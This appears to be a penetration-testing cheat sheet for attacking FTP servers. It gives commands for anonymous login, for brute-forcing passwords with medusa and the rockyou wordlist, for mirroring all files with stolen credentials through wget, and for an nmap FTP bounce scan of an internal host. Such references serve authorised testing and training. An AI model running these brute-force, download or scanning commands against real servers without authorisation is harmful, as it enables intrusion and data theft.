## Ftp anonymous

```sh
ftp "$user@$target"
```

>If FTP server allows anonymous log in, use the credential `anonymous:anonymous`

## Spray and pray

Know username

```sh
medusa -u $user -P /usr/share/wordlists/rockyou.txt -h $target -M ftp
```

No username

```sh
medusa -U ./username.list -P /usr/share/wordlists/rockyou.txt -h $target -M ftp
```

## Spider and download

```sh
wget -m --no-passive "ftp://$user:$pass@$target"
```

## FTP bounce

Use to scan ports of an internal machine not exposed to public network. Use the FTP server to send those traffics. Doesn't really work unless misconfigured or old tech.

```sh
nmap -Pn -v -n -p80 -b "$user:$pass@$target" 172.17.0.2
```
